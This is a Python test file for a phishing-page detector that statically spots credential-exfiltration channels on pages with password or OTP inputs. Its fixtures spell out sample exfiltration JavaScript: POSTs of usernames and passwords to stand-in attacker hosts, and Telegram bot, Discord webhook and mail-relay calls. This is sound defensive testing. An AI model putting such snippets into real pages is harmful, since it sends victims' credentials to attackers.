"""S1/S2: credential-exfiltration signals, by static inspection of the rendered DOM and the page's JavaScript only.
Nothing is ever typed, clicked or submitted. Both fire only on a page that asks for a password or an OTP."""
from services.enrich.exfil import credential_input, exfil_endpoints, foreign_post_endpoints

TOKEN = "7012345678:AAH" + "x" * 32
PW = '<form><input type="password" name="p"></form>'
PAGE = "https://meesho-all.cfd/"


# ---- the credential-input precondition ------------------------------------------------------------------------
def test_password_and_otp_inputs_count():
    assert credential_input(PW)
    assert credential_input('<input autocomplete="one-time-code" name="code">')
    assert credential_input('<input type="tel" name="otp" placeholder="Enter OTP">')


def test_other_inputs_do_not_count():
    assert not credential_input('<input type="text" name="q" placeholder="Search">')
    assert not credential_input('<input name="pincode" placeholder="PIN code">')  # a postcode is not a credential
    assert not credential_input("<p>Your OTP will be sent by SMS</p>")             # text, not an input


# ---- S1: exfiltration endpoints --------------------------------------------------------------------------------
def test_telegram_bot_send_message_with_token():
    js = f'fetch("https://api.telegram.org/bot{TOKEN}/sendMessage", {{method: "POST", body: d}})'
    hits = exfil_endpoints(PW, [("https://x/app.js", js)])
    assert [h.kind for h in hits] == ["telegram_bot"] and hits[0].where == "https://x/app.js"


def test_telegram_url_built_from_parts_still_needs_the_token():
    js = f'const t="{TOKEN}"; const u="https://api.telegram.org/bot"+t+"/sendDocument";'
    assert [h.kind for h in exfil_endpoints(PW, [("inline#0", js)])] == ["telegram_bot"]


def test_bare_telegram_links_and_share_buttons_do_not_fire():
    html = PW + '<a href="https://t.me/meesho">Telegram</a><a href="https://t.me/share/url?url=x">Share</a>'
    js = 'const api = "https://api.telegram.org/"; // no bot token anywhere'
    assert exfil_endpoints(html, [("inline#0", js)]) == []


def test_discord_webhook_fires():
    js = 'axios.post("https://discord.com/api/webhooks/123456789012345678/abcDEF_ghi-JKL", {content: c})'
    assert [h.kind for h in exfil_endpoints(PW, [("inline#0", js)])] == ["discord_webhook"]


def test_mail_and_form_relay_apis_fire():
    for js, kind in [('fetch("https://api.mailgun.net/v3/mg.x.com/messages",{method:"POST"})', "mail_api"),
                     ('fetch("https://api.sendgrid.com/v3/mail/send",{method:"POST"})', "mail_api"),
                     ('<form action="https://formspree.io/f/xyzabcd">', "form_relay"),
                     ('$.post("https://getform.io/f/abc123", data)', "form_relay")]:
        assert [h.kind for h in exfil_endpoints(PW, [("inline#0", js)])] == [kind], js


def test_exfil_never_fires_without_a_credential_input():
    js = f'fetch("https://api.telegram.org/bot{TOKEN}/sendMessage")'
    assert exfil_endpoints("<p>contact us</p>", [("inline#0", js)]) == []


# ---- S2: credential capture to a foreign origin ----------------------------------------------------------------
def test_spa_bundle_posting_to_a_foreign_origin_fires():
    js = 'async function s(u,p){await fetch("https://panel.evil-collector.top/api/save",{method:"POST",body:JSON.stringify({u,p})})}'
    hits = foreign_post_endpoints(PW, [("https://meesho-all.cfd/assets/index.js", js)], [], PAGE, legit_sites=set())
    assert [h.origin for h in hits] == ["https://panel.evil-collector.top"]
    assert hits[0].where == "https://meesho-all.cfd/assets/index.js"


def test_xhr_axios_jquery_and_beacon_forms_are_recognised():
    for js in ['x.open("POST", "https://c.evil.top/a")', 'axios.post("https://c.evil.top/a", d)',
               '$.ajax({url: "https://c.evil.top/a", type: "POST", data: d})', 'navigator.sendBeacon("https://c.evil.top/a", d)']:
        assert [h.origin for h in foreign_post_endpoints(PW, [("inline#0", js)], [], PAGE, set())] == \
            ["https://c.evil.top"], js


def test_same_site_brand_site_and_benign_third_parties_do_not_fire():
    js = ('fetch("/api/login",{method:"POST"}); fetch("https://api.meesho-all.cfd/x",{method:"POST"});'
          'fetch("https://www.google-analytics.com/g/collect",{method:"POST"});'
          'fetch("https://www.google.com/recaptcha/api2/reload",{method:"POST"});'
          'fetch("https://supplier.meesho.com/login",{method:"POST"})')
    assert foreign_post_endpoints(PW, [("inline#0", js)], [], PAGE, legit_sites={"meesho.com"}) == []


def test_get_requests_do_not_count():
    js = 'fetch("https://cdn.other.top/config.json")'
    assert foreign_post_endpoints(PW, [("inline#0", js)], [], PAGE, set()) == []


def test_observed_post_during_load_counts():
    hits = foreign_post_endpoints(PW, [], [("POST", "https://c.evil.top/visit", "fetch")], PAGE, set())
    assert [(h.origin, h.where) for h in hits] == [("https://c.evil.top", "network: POST during page load")]


def test_foreign_post_needs_a_credential_input():
    js = 'fetch("https://c.evil.top/a",{method:"POST"})'
    assert foreign_post_endpoints("<p>hi</p>", [("inline#0", js)], [], PAGE, set()) == []
